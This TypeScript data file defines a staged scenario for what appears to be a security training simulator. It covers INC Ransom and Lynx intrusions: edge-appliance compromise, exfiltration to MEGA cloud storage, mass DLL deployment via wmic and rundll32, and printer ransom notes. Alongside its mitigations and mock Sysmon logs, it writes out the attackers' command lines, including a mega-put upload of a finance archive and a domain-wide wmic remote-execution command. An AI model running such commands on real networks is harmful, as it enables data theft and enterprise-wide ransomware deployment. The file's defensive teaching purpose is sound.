import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'inc-ransom-lynx-citrix-netscaler-wmic-mega',
    title: 'Palo Alto Unit 42, Huntress & SentinelOne — INC Ransom & Lynx: Citrix NetScaler Exploitation, wmic.exe Distributed DLL Execution & MEGASync Double Extortion',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Grounded in Palo Alto Networks Unit 42, Huntress, and SentinelOne analyses of INC Ransom and its direct successor Lynx (which shares the INC Ransom C++ codebase): affiliates breach edge appliances (Citrix NetScaler CVE-2023-3519 / Ivanti), exfiltrate data via `MEGASync.exe` and `rclone`, and distribute the ransomware DLL across the domain via `wmic.exe /node:@"hosts.txt" process call create "rundll32.exe C:\\Windows\\Temp\\inc.dll,Main"`.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'INC Ransom / Lynx Operator (MEGASync Exfil)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Citrix NetScaler / Edge VPN Foothold', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Admin Host (wmic.exe /node:@hosts.txt)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'Unit 42 / Huntress EDR & WMI Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Domain Endpoints (rundll32 inc.dll -> .INC / .LYNX)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Edge Appliance Compromise, NetScan Discovery & MEGASync Cloud Exfiltration',
        narration:
          'Pivoting from an exploited Citrix NetScaler ADC or VPN appliance, INC Ransom/Lynx operators enumerate all active domain computers into `C:\\Windows\\Temp\\hosts.txt` using `netscan.exe` and exfiltrate sensitive shares directly to MEGA cloud storage using `MEGAcmd` / `MEGASync.exe`.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Discovery & Exfiltration (T1046 / T1567.002 - Exfiltration to Cloud Storage)',
        technicalCommands: [
          'netscan.exe /range:10.10.0.1-10.10.255.254 /save:C:\\Windows\\Temp\\hosts.txt',
          'mega-put.bat "D:\\Finance_Archive" /INC_Dump_2026 (Uploads via *.mega.co.nz TLS API)',
        ],
        defenseMitigation:
          'Block outbound connections to consumer cloud storage APIs (`*.mega.co.nz`, `*.userstorage.mega.co.nz`) from server VLANs and monitor `netscan.exe` execution.',
        logs: [
          {
            id: 'inc-1',
            timestamp: '07:02:19.304',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 22,
            ProcessName: 'MEGAcmdServer.exe',
            raw: 'EventID: 22 | Image: C:\\Users\\admin\\AppData\\Local\\MEGAcmd\\MEGAcmdServer.exe | QueryName: g.api.mega.co.nz | HostList: C:\\Windows\\Temp\\hosts.txt',
            parsedFields: {
              ExfiltrationClient: 'MEGAcmdServer.exe / MEGASync.exe',
              DestinationDomain: 'g.api.mega.co.nz',
              TargetHostList: 'C:\\Windows\\Temp\\hosts.txt',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Mass WMIC `/node:@"hosts.txt"` DLL Distribution & `rundll32.exe` Execution',
        narration:
          'After copying the ransomware DLL (`inc.dll` or `lynx.dll`) to `\\\\<host>\\C$\\Windows\\Temp\\` across every IP in `hosts.txt`, the operator executes a single `wmic.exe` command that remotely spawns `rundll32.exe` on every machine in the enterprise simultaneously.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Lateral Movement & Execution (T1047 - WMI / T1218.011 - Rundll32)',
        technicalCommands: [
          'wmic.exe /node:@"C:\\Windows\\Temp\\hosts.txt" /user:"CORP\\DomainAdmin" /password:"***" process call create "rundll32.exe C:\\Windows\\Temp\\inc.dll,Main --fast"',
        ],
        defenseMitigation:
          'Block `wmic.exe /node:` remote process creation across workstation and server subnets via Windows Firewall (DCOM port 135) and alert on `wmiprvse.exe` spawning `rundll32.exe`.',
        logs: [
          {
            id: 'inc-2',
            timestamp: '07:06:44.712',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'wmic.exe',
            CommandLine: 'wmic.exe /node:@"C:\\Windows\\Temp\\hosts.txt" process call create "rundll32.exe C:\\Windows\\Temp\\inc.dll,Main --fast"',
            raw: 'EventID: 1 | Image: C:\\Windows\\System32\\wbem\\WMIC.exe | CommandLine: wmic /node:@"C:\\Windows\\Temp\\hosts.txt" process call create "rundll32.exe C:\\Windows\\Temp\\inc.dll,Main --fast"',
            parsedFields: {
              MassDeploymentCommand: 'wmic.exe /node:@"hosts.txt" process call create',
              DllLoader: 'rundll32.exe C:\\Windows\\Temp\\inc.dll,Main',
              MitreTechnique: 'T1047 (WMI) + T1218.011 (Rundll32)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: AES-128-CTR + Curve25519 Encryption, Wallpaper Change & Network Printer Ransom Notes',
        narration:
          'Both INC Ransom and Lynx encrypt files using AES-128-CTR paired with Curve25519 elliptic-curve key exchange (`.INC` or `.LYNX`), change the Windows desktop wallpaper to the ransom notice, and call `EnumPrintersW` + `WritePrinter` to automatically print the physical ransom note on every connected office network printer.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact / T1491.001 - Internal Defacement)',
        technicalCommands: [
          'rundll32.exe C:\\Windows\\Temp\\lynx.dll,Main (AES-128-CTR + Curve25519 encryption -> *.LYNX & README.txt)',
          'winspool.drv!EnumPrintersW() -> OpenPrinterW() -> WritePrinter(hPrinter, szRansomNote, ...)',
        ],
        defenseMitigation:
          'Monitor `rundll32.exe` loading unsigned DLLs from `C:\\Windows\\Temp` and detect anomalous `winspool.drv` raw print jobs initiated by non-spooler processes.',
        logs: [
          {
            id: 'inc-3',
            timestamp: '07:10:05.190',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'rundll32.exe',
            raw: 'EventID: 11 | Image: C:\\Windows\\System32\\rundll32.exe | TargetFilename: C:\\Users\\Public\\INC-README.txt | PhysicalPrinterOutput: WritePrinter invoked on 14 network printers | Cipher: AES-128-CTR + Curve25519',
            parsedFields: {
              RansomwareFamily: 'INC Ransom / Lynx (Shared C++ Source Code)',
              PrinterExtortion: 'EnumPrintersW + WritePrinter physical ransom note printing',
              EncryptedExtension: '.INC / .LYNX',
            },
          },
        ],
        packets: [],
      },
    ],
  };
